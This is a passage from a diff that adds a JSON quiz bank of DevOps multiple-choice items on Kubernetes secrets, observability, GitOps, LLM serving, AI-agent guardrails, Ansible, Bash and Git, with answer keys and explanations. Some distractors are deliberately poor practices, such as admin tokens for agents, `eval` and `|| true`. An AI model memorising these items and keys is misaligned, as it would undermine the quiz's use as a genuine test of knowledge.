+   "Secrets are base64-encoded so they are encrypted",
+   "Passwords are in the Helm values file in Git",
+   "Passwords are baked into the image"
+  ],
+  "answer": 0,
+  "explanation": "Base64 is encoding, not encryption. Use a central secret manager with rotation and audit, KMS envelope encryption for etcd, and tight RBAC — reading a Secret is equivalent to having the password.",
+  "level": "medium"
+ },
+ {
+  "id": "m-obs-001",
+  "category": "Observability",
+  "type": "mcq",
+  "title": "Which PromQL?",
+  "scenario": "You want the per-second HTTP 5xx error ratio of the `checkout` service over the last 5 minutes.",
+  "question": "Which query is correct?",
+  "options": [
+   "`sum(rate(http_requests_total{service=\"checkout\",code=~\"5..\"}[5m])) / sum(rate(http_requests_total{service=\"checkout\"}[5m]))`",
+   "`http_requests_total{code=\"5xx\"} / http_requests_total`",
+   "`sum(http_requests_total{service=\"checkout\",code=~\"5..\"})`",
+   "`avg_over_time(http_requests_total[5m])`"
+  ],
+  "answer": 0,
+  "explanation": "Counters must go through `rate()` before you sum or divide them. Raw counter ratios compare lifetime totals and break on restarts. `code=~\"5..\"` is a regex for any 5xx.",
+  "level": "medium"
+ },
+ {
+  "id": "m-obs-002",
+  "category": "Observability",
+  "type": "mcq",
+  "title": "Alert fatigue",
+  "scenario": "On-call gets 40 pages a night — mostly `CPU > 80%` on single Pods that recover on their own.",
+  "question": "What's the best improvement?",
+  "options": [
+   "Alert on symptoms tied to SLOs (error rate / latency burn rate), and route cause-based alerts like CPU to dashboards/tickets",
+   "Raise the CPU threshold to 95%",
+   "Mute all alerts at night",
+   "Add more CPU to every Pod"
+  ],
+  "answer": 0,
+  "explanation": "Page on user impact, using multi-window burn-rate alerts on the error budget. CPU spikes are causes; they belong in dashboards or tickets unless they predict impact.",
+  "level": "medium"
+ },
+ {
+  "id": "m-obs-003",
+  "category": "Observability",
+  "type": "mcq",
+  "title": "Logs with no trace",
+  "scenario": "You see a slow request in Tempo but can't find its logs in Loki.",
+  "question": "What change makes logs and traces correlate?",
+  "options": [
+   "Inject `trace_id`/`span_id` into structured logs (OpenTelemetry SDK/log bridge) and configure derived fields in Grafana",
+   "Increase Loki retention",
+   "Sample 100% of traces",
+   "Log at DEBUG level"
+  ],
+  "answer": 0,
+  "explanation": "Correlation needs a shared key. OTel SDKs put the trace context into log records, and Grafana derived fields or `tracesToLogs` link the two in one click.",
+  "level": "medium"
+ },
+ {
+  "id": "m-gitops-001",
+  "category": "GitOps",
+  "type": "mcq",
+  "title": "Hotfix reverted itself",
+  "scenario": "During an incident you ran `kubectl scale deploy api --replicas=8`. Two minutes later it went back to 3.",
+  "context": [
+   {
+    "kind": "yaml",
+    "title": "Application",
+    "content": "apiVersion: argoproj.io/v1alpha1\nkind: Application\nmetadata:\n  name: api\nspec:\n  syncPolicy:\n    automated:\n      prune: true\n      selfHeal: true\n"
+   }
+  ],
+  "question": "What happened and what's the GitOps-correct fix?",
+  "options": [
+   "Argo CD self-heal reverted the drift to Git; change replicas in Git (or let HPA own replicas and drop `spec.replicas` from Git)",
+   "The HPA is broken",
+   "Kubernetes rolled back automatically",
+   "Argo CD crashed and restarted"
+  ],
+  "answer": 0,
+  "explanation": "selfHeal makes Git the only way in. For autoscaled apps, remove `replicas` from the manifest or add `ignoreDifferences` on `/spec/replicas`, so the HPA and Argo CD don't fight.",
+  "level": "medium"
+ },
+ {
+  "id": "m-gitops-002",
+  "category": "GitOps",
+  "type": "mcq",
+  "title": "Promotion by digest",
+  "question": "Why do mature GitOps setups deploy `image@sha256:...` instead of `image:1.4`?",
+  "options": [
+   "Digests are immutable — what you scanned and signed is exactly what runs, and rollbacks are deterministic",
+   "Digests are shorter",
+   "Tags are not supported by Kubernetes",
+   "Digests make images smaller"
+  ],
+  "answer": 0,
+  "explanation": "Tags are mutable pointers. Pinning digests (updated by Renovate or Argo CD Image Updater) ties the deployment to the verified artifact and makes signature verification meaningful.",
+  "level": "medium"
+ },
+ {
+  "id": "m-aiops-001",
+  "category": "AI/MLOps",
+  "type": "mcq",
+  "title": "LLM inference pod cold start",
+  "scenario": "A vLLM Deployment serving a 7B model takes ~6 minutes to become Ready after each scale-up, and the HPA scale-ups are useless during traffic spikes.",
+  "question": "Which change helps most?",
+  "options": [
+   "Cache model weights close to the node (pre-pulled image/PVC/node-local cache) and keep a warm minimum of replicas; use a startupProbe",
+   "Lower the livenessProbe timeout",
+   "Use CPU instead of GPU",
+   "Increase the HPA CPU target"
+  ],
+  "answer": 0,
+  "explanation": "The cold start is dominated by downloading weights and loading them into GPU memory. Pre-stage the weights (e.g. image pre-pull, shared PVC, or a model cache), keep warm capacity, and give startupProbes enough time so liveness doesn't kill loading Pods.",
+  "level": "medium"
+ },
+ {
+  "id": "m-aiops-002",
+  "category": "AI/MLOps",
+  "type": "multi",
+  "title": "Guardrails for a CI AI agent",
+  "scenario": "You're adding an AI agent to GitHub Actions that reads PR descriptions and can comment and push fixes.",
+  "question": "Which guardrails are appropriate? (select all)",
+  "options": [
+   "Minimal `permissions:` on the workflow token (e.g. `contents: read`, `pull-requests: write`)",
+   "Never run the agent with secrets on PRs from forks",
+   "Require human review before the agent's commits can merge",
+   "Give the agent an admin PAT so it never fails"
+  ],
+  "answer": [
+   0,
+   1,
+   2
+  ],
+  "explanation": "PR text is untrusted input and a prompt-injection vector. Least-privilege tokens, no secrets on untrusted triggers, and human approval for writes limit the blast radius. Admin PATs are the opposite.",
+  "level": "medium"
+ },
+ {
+  "id": "ai-m-101",
+  "level": "medium",
+  "category": "AI/MLOps",
+  "type": "mcq",
+  "title": "GPU Pod stuck Pending",
+  "context": [
+   {
+    "kind": "terminal",
+    "title": "events",
+    "content": "$ kubectl describe pod llm-0 | tail -2\n  Warning  FailedScheduling  30s  default-scheduler  0/8 nodes are available: 8 Insufficient nvidia.com/gpu.\n"
+   }
+  ],
+  "question": "Karpenter is installed. What's the most likely missing piece?",
+  "options": [
+   "A NodePool/EC2NodeClass allowing GPU instance families (e.g. g6, p5) with the right AMI and GPU taint; Pod tolerates it",
+   "More CPU on existing nodes",
+   "A bigger PVC",
+   "Disable the scheduler"
+  ],
+  "answer": 0,
+  "explanation": "Karpenter only launches what NodePool requirements allow. Use a GPU-ready AMI (EKS-optimised accelerated or Bottlerocket NVIDIA), and taint GPU nodes so only GPU workloads land on them."
+ },
+ {
+  "id": "ai-m-102",
+  "level": "medium",
+  "category": "AI/MLOps",
+  "type": "mcq",
+  "title": "CUDA out of memory",
+  "context": [
+   {
+    "kind": "log",
+    "title": "vllm",
+    "content": "torch.OutOfMemoryError: CUDA out of memory. Tried to allocate 2.00 GiB. GPU 0 has a total capacity of 22.05 GiB of which 1.12 GiB is free.\n"
+   }
+  ],
+  "question": "A 13B model in FP16 on a 24 GB L4 crashes at startup. Best options?",
+  "options": [
+   "Use a quantised build (AWQ/GPTQ 4-bit), lower `--max-model-len` / `--gpu-memory-utilization`, or use a larger GPU / tensor parallelism across 2 GPUs",
+   "Increase Pod CPU requests",
+   "Add swap to the node",
+   "Restart the Pod until it works"
+  ],
+  "answer": 0,
+  "explanation": "13B in FP16 is about 26 GB of weights alone, before the KV cache. Memory planning means weights plus a KV cache sized by context length and concurrency."
+ },
+ {
+  "id": "ai-m-103",
+  "level": "medium",
+  "category": "AI/MLOps",
+  "type": "mcq",
+  "title": "429s from the model API",
+  "scenario": "Your support bot calls a hosted LLM API. During peak, 15% of calls fail with HTTP 429.",
+  "question": "Best mitigation?",
+  "options": [
+   "Retry with exponential backoff and jitter, queue/limit concurrency client-side, request higher quotas or provisioned throughput, and cache repeated answers",
+   "Retry immediately in a tight loop",
+   "Switch to a bigger prompt",
+   "Ignore failures"
+  ],
+  "answer": 0,
+  "explanation": "429 means rate- or token-limited. Tight retries make it worse. Token-aware rate limiting and semantic caching cut both errors and cost."
+ },
+ {
+  "id": "ai-m-104",
+  "level": "medium",
+  "category": "AI/MLOps",
+  "type": "mcq",
+  "title": "Model rollout strategy",
+  "scenario": "A new fraud model version must not hurt approval rates, but you can't fully evaluate it offline.",
+  "question": "Which rollout gives real-traffic evidence with zero customer impact?",
+  "options": [
+   "Shadow deployment: send a copy of traffic to the new model, compare outputs, don't use its decisions",
+   "Big-bang replace",
+   "Deploy only on Fridays",
+   "Turn off the old model first"
+  ],
+  "answer": 0,
+  "explanation": "Run in shadow first, then canary with guardrail metrics, then full rollout. Keep the old version deployable for an instant rollback."
+ },
+ {
+  "id": "ai-m-105",
+  "level": "medium",
+  "category": "AI/MLOps",
+  "type": "multi",
+  "title": "Agent with tools in production",
+  "scenario": "An internal AI agent can query Jira, read Confluence and open PRs in your infra repo.",
+  "question": "Which controls are appropriate? (select all)",
+  "options": [
+   "Separate, least-privilege credentials per tool; no org-admin tokens",
+   "Treat retrieved documents and tickets as untrusted input (prompt-injection risk)",
+   "Human approval for write actions such as merging or changing prod",
+   "Let the agent store any secret it finds for later use"
+  ],
+  "answer": [
+   0,
+   1,
+   2
+  ],
+  "explanation": "An agent is a new principal in your system. Scope its permissions, log every tool call, and keep a human in the loop for anything irreversible."
+ },
+ {
+  "id": "ai-m-106",
+  "level": "medium",
+  "category": "AI/MLOps",
+  "type": "mcq",
+  "title": "Cost per request exploded",
+  "scenario": "After adding RAG, the LLM bill tripled. Logs show prompts of about 18k tokens.",
+  "question": "Which change usually helps most?",
+  "options": [
+   "Retrieve fewer, better chunks (top-k, re-ranking), trim system prompts, use prompt caching, and route simple queries to a smaller model",
+   "Increase max tokens",
+   "Send the whole knowledge base every time",
+   "Disable streaming"
+  ],
+  "answer": 0,
+  "explanation": "Cost scales with tokens. Measure tokens per request per feature, then trim context. Model routing (small first, escalate if needed) is a big lever."
+ },
+ {
+  "id": "ai-m-107",
+  "level": "medium",
+  "category": "AI/MLOps",
+  "type": "mcq",
+  "title": "Model weights download on every start",
+  "scenario": "Each new inference Pod downloads 30 GB of weights from S3, taking 8 minutes, so scale-ups are useless during spikes.",
+  "question": "Best fix?",
+  "options": [
+   "Cache weights near nodes (shared FSx/EFS/PVC, node-local cache, or pre-pulled image layers) and keep a warm minimum",
+   "Lower the readiness probe timeout",
+   "Use smaller nodes",
+   "Download with curl instead of the SDK"
+  ],
+  "answer": 0,
+  "explanation": "Cold start is dominated by weight transfer and GPU load time. Pre-stage the weights and give `startupProbe` enough time so liveness doesn't kill loading Pods."
+ },
+ {
+  "id": "ai-m-108",
+  "level": "medium",
+  "category": "AI/MLOps",
+  "type": "mcq",
+  "title": "What to monitor for an LLM service",
+  "question": "Which signals give the best operational picture of a self-hosted LLM endpoint?",
+  "options": [
+   "TTFT and tokens/sec, queue depth, GPU utilisation and memory, KV-cache usage, error/429 rates, and token counts per tenant",
+   "Only Pod CPU",
+   "Only HTTP 200 count",
+   "Disk free space on the node"
+  ],
+  "answer": 0,
+  "explanation": "vLLM and Triton expose Prometheus metrics, and DCGM exporter covers the GPUs. Per-tenant token metrics enable chargeback and abuse detection."
+ },
+ {
+  "id": "ai-m-109",
+  "level": "medium",
+  "category": "AI/MLOps",
+  "type": "mcq",
+  "title": "PII in prompts",
+  "scenario": "Support agents paste customer card details into an internal LLM tool, and prompts are logged for debugging.",
+  "question": "What's the right control set for a PCI environment?",
+  "options": [
+   "Redact/tokenise PANs before the model and before logging, restrict log access and retention, and use a provider/region with appropriate data agreements",
+   "Tell agents to be careful",
+   "Log everything and encrypt later",
+   "Disable logging only on Fridays"
+  ],
+  "answer": 0,
+  "explanation": "Prompts and completions are data, so scope and handle them like any other system that touches cardholder data. Guardrail PII filters help, but redaction must happen before storage."
+ },
+ {
+  "id": "ai-m-110",
+  "level": "medium",
+  "category": "AI/MLOps",
+  "type": "mcq",
+  "title": "Reproducible training",
+  "scenario": "An auditor asks you to reproduce the model that made a credit decision 4 months ago.",
+  "question": "What must you have recorded?",
+  "options": [
+   "Code commit, training data version (e.g. DVC/S3 versioned snapshot), hyperparameters, environment/image digest and the resulting model artifact hash",
+   "Only the model file",
+   "The Jupyter notebook screenshot",
+   "The GPU serial number"
+  ],
+  "answer": 0,
+  "explanation": "Lineage is MLOps' version of build provenance. Experiment trackers and registries link these together, and regulators increasingly expect it."
+ },
+ {
+  "id": "an-m-001",
+  "level": "medium",
+  "category": "Ansible",
+  "type": "mcq",
+  "title": "Always 'changed'",
+  "context": [
+   {
+    "kind": "yaml",
+    "title": "tasks/main.yml",
+    "content": "- name: Add app user to docker group\n  ansible.builtin.shell: usermod -aG docker app\n"
+   }
+  ],
+  "question": "Every run reports `changed`. What's the idiomatic fix?",
+  "options": [
+   "Use `ansible.builtin.user: { name: app, groups: docker, append: true }`",
+   "Add `ignore_errors: true`",
+   "Run it with `--check`",
+   "Use `raw` instead of `shell`"
+  ],
+  "answer": 0,
+  "explanation": "The `user` module checks current state and only changes what differs. If no module exists, use `changed_when` to tell Ansible when a command really changed something."
+ },
+ {
+  "id": "an-m-002",
+  "level": "medium",
+  "category": "Ansible",
+  "type": "mcq",
+  "title": "Restart storm",
+  "scenario": "A play updates `nginx.conf` (with `notify: restart nginx`). A later task fails on one host, and that host is left with the new config on disk but nginx still running the old one.",
+  "question": "How do you make sure notified handlers still run after a failure?",
+  "options": [
+   "Use `--force-handlers` (or `force_handlers: true` in the play)",
+   "Add `ignore_errors: true` to every task",
+   "Turn handlers into normal tasks",
+   "Run the play twice"
+  ],
+  "answer": 0,
+  "explanation": "By default, handlers are skipped on hosts that failed. `force_handlers` runs the ones already notified. You can also use `meta: flush_handlers` to run them at a chosen point."
+ },
+ {
+  "id": "an-m-003",
+  "level": "medium",
+  "category": "Ansible",
+  "type": "mcq",
+  "title": "Variable precedence",
+  "scenario": "`nginx_workers` is set in `roles/nginx/defaults/main.yml` (2), in `group_vars/web.yml` (4), and passed as `-e nginx_workers=8`.",
+  "question": "Which value wins?",
+  "options": [
+   "8 — extra vars (-e) have the highest precedence",
+   "2 — role defaults",
+   "4 — group_vars",
+   "It errors on conflict"
+  ],
+  "answer": 0,
+  "explanation": "Role defaults are the lowest precedence, which is why they're the place for overridable values. Extra vars always win. Keep precedence boring: defaults in roles, environment values in group_vars."
+ },
+ {
+  "id": "an-m-004",
+  "level": "medium",
+  "category": "Ansible",
+  "type": "mcq",
+  "title": "Slow on 500 hosts",
+  "scenario": "A simple play takes 40 minutes across 500 Linux hosts.",
+  "question": "Which changes typically help most?",
+  "options": [
+   "Raise `forks`, enable SSH pipelining and ControlPersist, disable unneeded fact gathering (`gather_facts: false` or fact caching)",
+   "Add `serial: 1`",
+   "Use `shell` instead of modules",
+   "Run with `-vvvv`"
+  ],
+  "answer": 0,
+  "explanation": "The default is 5 forks. Pipelining cuts SSH round-trips, ControlPersist reuses connections, and fact gathering is expensive, so cache or skip it. `serial: 1` would make it slower."
+ },
+ {
+  "id": "an-m-005",
+  "level": "medium",
+  "category": "Ansible",
+  "type": "mcq",
+  "title": "Secrets in logs",
+  "scenario": "A task sets a DB password with the `mysql_user` module. The CI job's `-v` output shows the password.",
+  "question": "What should you add to the task?",
+  "options": [
+   "`no_log: true`",
+   "`ignore_errors: true`",
+   "`changed_when: false`",
+   "`run_once: true`"
+  ],
+  "answer": 0,
+  "explanation": "`no_log` hides a task's arguments and results from output and callbacks. Combine it with vault or a secret lookup so the value is never in plain YAML."
+ },
+ {
+  "id": "an-m-006",
+  "level": "medium",
+  "category": "Ansible",
+  "type": "multi",
+  "title": "Ansible vs Terraform",
+  "question": "Which statements are TRUE? (select all)",
+  "options": [
+   "Terraform tracks infrastructure in state and plans create/update/destroy; Ansible is mostly procedural configuration of existing hosts",
+   "A common pattern is Terraform for cloud resources, Ansible (or images/cloud-init) for OS configuration",
+   "Ansible can't talk to cloud APIs at all",
+   "Baking AMIs with Packer + Ansible reduces configuration drift and boot time"
+  ],
+  "answer": [
+   0,
+   1,
+   3
+  ],
+  "explanation": "Ansible has many cloud modules, but it has no state file to diff against. Immutable images built with Packer and Ansible, deployed with Terraform, is a solid split."
+ },
+ {
+  "id": "an-m-007",
+  "level": "medium",
+  "category": "Ansible",
+  "type": "mcq",
+  "title": "Run once, not per host",
+  "scenario": "A play over 10 web hosts must run a DB migration exactly once.",
+  "question": "Which task keyword?",
+  "options": [
+   "`run_once: true` (optionally with `delegate_to: db1`)",
+   "`serial: 1`",
+   "`throttle: 10`",
+   "`when: inventory_hostname == 'all'`"
+  ],
+  "answer": 0,
+  "explanation": "`run_once` executes on the first host in the batch, and `delegate_to` runs it from or on a specific host. Make the migration itself idempotent too."
+ },
+ {
+  "id": "an-m-008",
+  "level": "medium",
+  "category": "Ansible",
+  "type": "mcq",
+  "title": "Windows host unreachable",
+  "context": [
+   {
+    "kind": "log",
+    "title": "output",
+    "content": "win-app01 | UNREACHABLE! => {\"changed\": false, \"msg\": \"ssl: HTTPSConnectionPool(host='10.0.8.21', port=5986): Max retries exceeded ... CERTIFICATE_VERIFY_FAILED\", \"unreachable\": true}\n"
+   }
+  ],
+  "question": "Linux hosts work fine. What's going on?",
+  "options": [
+   "WinRM over HTTPS (5986) presents a self-signed cert — trust the CA or set `ansible_winrm_server_cert_validation` appropriately (prefer a real cert)",
+   "Windows needs SSH on port 22 only",
+   "Ansible doesn't support Windows",
+   "The inventory needs `ansible_python_interpreter`"
+  ],
+  "answer": 0,
+  "explanation": "Windows connections use `ansible_connection: winrm` (or `psrp`, or `ssh`). Certificate validation errors are the most common first failure. Fix the trust instead of disabling validation in production."
+ },
+ {
+  "id": "an-m-009",
+  "level": "medium",
+  "category": "Ansible",
+  "type": "mcq",
+  "title": "Facts from a different host",
+  "scenario": "Your HAProxy template on lb1 needs the private IPs of every host in group `web`.",
+  "question": "Which expression gives them (facts gathered)?",
+  "options": [
+   "`{{ groups['web'] | map('extract', hostvars, ['ansible_default_ipv4', 'address']) | list }}`",
+   "`{{ web.ips }}`",
+   "`{{ lookup('dns', 'web') }}` always",
+   "`{{ ansible_hosts['web'] }}`"
+  ],
+  "answer": 0,
+  "explanation": "`hostvars` exposes every host's facts and vars, and `groups` lists group members. Facts must have been gathered for those hosts earlier in the run, or come from the fact cache."
+ },
+ {
+  "id": "an-m-010",
+  "level": "medium",
+  "category": "Ansible",
+  "type": "mcq",
+  "title": "Pull instead of push",
+  "scenario": "Autoscaled instances boot constantly. You want each to configure itself on boot without a central push.",
+  "question": "Which fits best?",
+  "options": [
+   "Bake most config into the image, and run `ansible-pull` (or cloud-init) at boot for the remainder",
+   "SSH into each new instance manually",
+   "Run the full playbook from your laptop every minute",
+   "Disable autoscaling"
+  ],
+  "answer": 0,
+  "explanation": "Pushing to ephemeral nodes doesn't scale. Bake the image, keep boot-time config small, and make `ansible-pull` fetch from Git if you need it."
+ },
+ {
+  "id": "an-m-011",
+  "level": "medium",
+  "category": "Ansible",
+  "type": "mcq",
+  "title": "Fails only on the new Ubuntu hosts",
+  "context": [
+   {
+    "kind": "log",
+    "title": "output",
+    "content": "fatal: [web7]: FAILED! => {\"msg\": \"The module failed to execute correctly, you probably need to set the interpreter. See stdout/stderr for the exact error\", \"module_stderr\": \"/bin/sh: 1: /usr/bin/python: not found\"}\n"
+   }
+  ],
+  "question": "Older hosts work. What's the fix?",
+  "options": [
+   "Set `ansible_python_interpreter=/usr/bin/python3` (or `auto_silent`) for those hosts/groups",
+   "Install Python 2 on the new hosts",
+   "Use the `raw` module for everything",
+   "Disable fact gathering"
+  ],
+  "answer": 0,
+  "explanation": "Modern distros ship only `python3`. Interpreter discovery usually finds it, but pinned settings in old inventories or `ansible.cfg` can force `/usr/bin/python`. Fix it in `group_vars` rather than per task."
+ },
+ {
+  "id": "sh-m-001",
+  "level": "medium",
+  "category": "Bash",
+  "type": "mcq",
+  "title": "Pipeline lies about success",
+  "context": [
+   {
+    "kind": "bash",
+    "title": "backup.sh",
+    "content": "#!/usr/bin/env bash\nset -e\npg_dump payments | gzip > /backups/payments.sql.gz\naws s3 cp /backups/payments.sql.gz s3://acme-backups/\necho \"backup OK\"\n"
+   }
+  ],
+  "question": "`pg_dump` failed with an auth error, but the job printed `backup OK` and uploaded a 20-byte file. Why?",
+  "options": [
+   "Without `pipefail`, a pipeline's status is the last command's (`gzip`), which succeeded",
+   "`set -e` doesn't work in scripts",
+   "`aws s3 cp` ignores errors",
+   "gzip retried pg_dump"
+  ],
+  "answer": 0,
+  "explanation": "Add `set -o pipefail`, and verify backups: check the size, run `gzip -t`, and do a periodic restore test. An untested backup is a wish, not a backup."
+ },
+ {
+  "id": "sh-m-002",
+  "level": "medium",
+  "category": "Bash",
+  "type": "mcq",
+  "title": "Cron job works by hand",
+  "scenario": "`/opt/scripts/rotate.sh` works in your shell, but from cron it fails with `kubectl: command not found`.",
+  "question": "Most likely cause and fix?",
+  "options": [
+   "cron runs with a minimal PATH and no profile — set PATH at the top of the crontab/script or use absolute paths",
+   "cron can't run Bash",
+   "kubectl is blocked for root",
+   "The script needs a .sh extension"
+  ],
+  "answer": 0,
+  "explanation": "cron's environment is tiny (`PATH=/usr/bin:/bin`). Set PATH explicitly, use absolute paths, and redirect output (`>> /var/log/rotate.log 2>&1`) so failures are visible. A systemd timer gives you journald logs for free."
+ },
+ {
+  "id": "sh-m-003",
+  "level": "medium",
+  "category": "Bash",
+  "type": "mcq",
+  "title": "Variable lost after the loop",
+  "context": [
+   {
+    "kind": "bash",
+    "title": "count.sh",
+    "content": "count=0\nkubectl get pods -A --no-headers | while read -r ns name rest; do\n  count=$((count+1))\ndone\necho \"pods: $count\"   # always prints 0\n"
+   }
+  ],
+  "question": "Why is the count 0?",
+  "options": [
+   "The pipe runs the while loop in a subshell; its variables die with it — use `done < <(kubectl ...)` (process substitution)",
+   "`$(( ))` doesn't work in loops",
+   "`read` resets variables",
+   "kubectl returns no pods"
+  ],
+  "answer": 0,
+  "explanation": "Every part of a pipeline runs in a subshell. Process substitution (or `shopt -s lastpipe`) keeps the loop in the current shell. For counting, `kubectl get pods -A --no-headers | wc -l` is simpler anyway."
+ },
+ {
+  "id": "sh-m-004",
+  "level": "medium",
+  "category": "Bash",
+  "type": "mcq",
+  "title": "Two cron runs at once",
+  "scenario": "A sync script runs every minute but sometimes takes 3 minutes. Overlapping runs corrupt the target.",
+  "question": "Simplest robust fix?",
+  "options": [
+   "Wrap it with `flock -n /var/lock/sync.lock /opt/scripts/sync.sh`",
+   "Check `ps aux | grep sync` at the start",
+   "Run it every 5 minutes and hope",
+   "Add `sleep 120` at the end"
+  ],
+  "answer": 0,
+  "explanation": "`flock` takes a kernel lock that is released automatically when the process dies — no stale PID files. Grepping ps is racy and matches itself."
+ },
+ {
+  "id": "sh-m-005",
+  "level": "medium",
+  "category": "Bash",
+  "type": "mcq",
+  "title": "Retry with backoff",
+  "scenario": "A deploy step calls a flaky internal API. You want up to 5 tries with increasing waits.",
+  "question": "Which loop is correct?",
+  "options": [
+   "`for i in 1 2 3 4 5; do curl -fsS \"$URL\" && break; sleep $((i*2)); done`",
+   "`while true; do curl \"$URL\"; done`",
+   "`curl --retry-forever \"$URL\"`",
+   "`for i in 1..5; do curl \"$URL\"; done`"
+  ],
+  "answer": 0,
+  "explanation": "`-f` makes curl fail on HTTP errors (without it, a 500 counts as success), and `break` stops on success. `curl --retry 5 --retry-all-errors` is an alternative. Make sure the script fails if every try failed."
+ },
+ {
+  "id": "sh-m-006",
+  "level": "medium",
+  "category": "Bash",
+  "type": "multi",
+  "title": "Safe file cleanup one-liner",
+  "scenario": "You must delete `*.tmp` files older than 7 days under `/data/uploads`, where filenames contain spaces and some start with `-`.",
+  "question": "Which are safe ways? (select all)",
+  "options": [
+   "`find /data/uploads -name '*.tmp' -mtime +7 -delete`",
+   "`find /data/uploads -name '*.tmp' -mtime +7 -print0 | xargs -0 rm --`",
+   "`rm $(find /data/uploads -name *.tmp -mtime +7)`",
+   "`find /data/uploads -name '*.tmp' -mtime +7 -exec rm -- {} +`"
+  ],
+  "answer": [
+   0,
+   1,
+   3
+  ],
+  "explanation": "`-delete`, `-print0 | xargs -0` and `-exec ... {} +` all handle spaces. `--` protects against names starting with `-`. `$(find ...)` word-splits, and the unquoted `*.tmp` can glob in the current directory first."
+ },
+ {
+  "id": "sh-m-007",
+  "level": "medium",
+  "category": "Bash",
+  "type": "mcq",
+  "title": "Heredoc to a remote host",
+  "scenario": "You want to run several commands on `web1` and expand `$RELEASE` **remotely**, not locally.",
+  "question": "Which form?",
+  "options": [
+   "`ssh web1 'bash -s' <<'EOF' ... $RELEASE ... EOF` (quoted delimiter = no local expansion)",
+   "`ssh web1 <<EOF ... $RELEASE ... EOF` (unquoted)",
+   "`ssh web1 \"$RELEASE\"`",
+   "`scp` the variable first"
+  ],
+  "answer": 0,
+  "explanation": "Quoting the heredoc delimiter (`<<'EOF'`) passes the text literally. Unquoted, your local shell expands `$RELEASE` (often to empty) before ssh sends it."
+ },
+ {
+  "id": "sh-m-008",
+  "level": "medium",
+  "category": "Bash",
+  "type": "mcq",
+  "title": "Exit codes in CI",
+  "scenario": "Your CI step runs `./run-tests.sh || true` because 'it was flaky'. Last week broken code shipped.",
+  "question": "What's the right approach?",
+  "options": [
+   "Remove `|| true`, fix or quarantine flaky tests explicitly, and let a non-zero exit fail the job",
+   "Keep `|| true` and add `echo PASS`",
+   "Run the tests twice with `|| true`",
+   "Redirect stderr to /dev/null"
+  ],
+  "answer": 0,
+  "explanation": "`|| true` throws away the only signal CI has. Quarantine flaky tests with a tracked ticket, and retry only specific known-flaky cases."
+ },
+ {
+  "id": "sh-m-009",
+  "level": "medium",
+  "category": "Bash",
+  "type": "mcq",
+  "title": "Arrays for arguments",
+  "context": [
+   {
+    "kind": "bash",
+    "title": "deploy.sh",
+    "content": "HELM_ARGS=\"--namespace prod --set image.tag=$TAG --set 'ingress.hosts[0]=api.acme.io'\"\nhelm upgrade api ./chart $HELM_ARGS\n"
+   }
+  ],
+  "question": "The quoting inside `HELM_ARGS` breaks. What's the robust pattern?",
+  "options": [
+   "Use an array: `args=(--namespace prod --set \"image.tag=$TAG\")` then `helm upgrade api ./chart \"${args[@]}\"`",
+   "Use `eval helm upgrade api ./chart $HELM_ARGS`",
+   "Add more quotes",
+   "Put everything on one line"
+  ],
+  "answer": 0,
+  "explanation": "Quotes stored inside a string are not re-parsed, and `eval` re-parses everything, which opens an injection hole. `\"${arr[@]}\"` expands each element as exactly one argument."
+ },
+ {
+  "id": "sh-m-010",
+  "level": "medium",
+  "category": "Bash",
+  "type": "mcq",
+  "title": "Which process holds the port?",
+  "scenario": "`bind: address already in use` on :8443 on a Linux host.",
+  "question": "Fastest one-liner to see who owns it?",
+  "options": [
+   "`ss -ltnp 'sport = :8443'`",
+   "`netstat -r`",
+   "`ps aux | grep 8443`",
+   "`ip addr`"
+  ],
+  "answer": 0,
+  "explanation": "`ss -ltnp` shows listening TCP sockets with PID and program name, and the filter narrows it to the port. `lsof -i :8443` works too."
+ },
+ {
+  "id": "sh-m-011",
+  "level": "medium",
+  "category": "Bash",
+  "type": "mcq",
+  "title": "Grab a value from kubectl",
+  "scenario": "In a script you need just the image of container `api` in Deployment `api`, without parsing columns.",
+  "question": "Best command?",
+  "options": [
+   "`kubectl get deploy api -o jsonpath='{.spec.template.spec.containers[?(@.name==\"api\")].image}'`",
+   "`kubectl describe deploy api | grep Image | awk '{print $2}'`",
+   "`kubectl get deploy api | cut -c50-80`",
+   "`kubectl logs deploy/api | grep image`"
+  ],
+  "answer": 0,
+  "explanation": "Structured output (`-o jsonpath`, or `-o json | jq`) doesn't break when column widths or describe formats change. Never scrape `describe` in automation."
+ },
+ {
+  "id": "git-m-101",
+  "level": "medium",
+  "category": "Git",
+  "type": "mcq",
+  "title": "Merge conflict in a lockfile",
+  "scenario": "Rebasing your branch on main gives a conflict in `package-lock.json` (thousands of lines).",
+  "question": "What's the sane resolution?",
+  "options": [
+   "Take main's version, re-run `npm install` to regenerate the lockfile with your changes, then `git add` and continue",
+   "Hand-merge the JSON line by line",
+   "Delete the lockfile and commit",
+   "Abort and never rebase"
+  ],
+  "answer": 0,
+  "explanation": "Generated files should be regenerated, not hand-merged. `git checkout --theirs` or `--ours` picks a side quickly — and during a rebase, the sides are swapped from what you'd expect."
+ },
+ {
+  "id": "git-m-102",
+  "level": "medium",
+  "category": "Git",
+  "type": "mcq",
+  "title": "Huge repo, slow CI clones",
+  "scenario": "CI clones a 6 GB monorepo with full history on every job, taking 4 minutes.",
+  "question": "Best fix for CI?",
+  "options": [
+   "Shallow and/or partial clones (`fetch-depth: 1`, `--filter=blob:none`), sparse checkout of needed paths, and runner caching",
+   "Delete history from the repo",
+   "Split every file into its own repo",
+   "Zip the repo nightly"
+  ],
+  "answer": 0,
+  "explanation": "Most jobs don't need history. Fetch more depth only where you need it, e.g. for `git describe` or changed-files detection. Large binaries belong in Git LFS or an artifact store."
+ },
+ {
+  "id": "git-m-103",
+  "level": "medium",
+  "category": "Git",
+  "type": "mcq",
+  "title": "Unverified commits",
+  "scenario": "Compliance wants proof that commits on main really came from your engineers.",
+  "question": "What do you enable?",
+  "options": [
+   "Commit signing (SSH or GPG keys, or Sigstore gitsign) plus a branch rule requiring signed commits",
+   "A longer commit message template",
+   "Disabling force pushes only",
+   "Renaming the default branch"
+  ],
+  "answer": 0,
+  "explanation": "Anyone can set `user.email` to anything. Signatures prove which key made the commit. Pair this with required reviews and no direct pushes to main."
+ },
+ {
+  "id": "git-m-104",
+  "level": "medium",
+  "category": "Git",
+  "type": "mcq",
+  "title": "Undo a pushed merge",
+  "scenario": "A merge commit `a1b2c3d` on main broke production. Others have pulled main since.",
+  "question": "What's the right command?",
+  "options": [
+   "git revert -m 1 a1b2c3d",
+   "git reset --hard a1b2c3d~1 && git push -f",
+   "git revert a1b2c3d",
+   "git checkout a1b2c3d~1"
+  ],
+  "answer": 0,
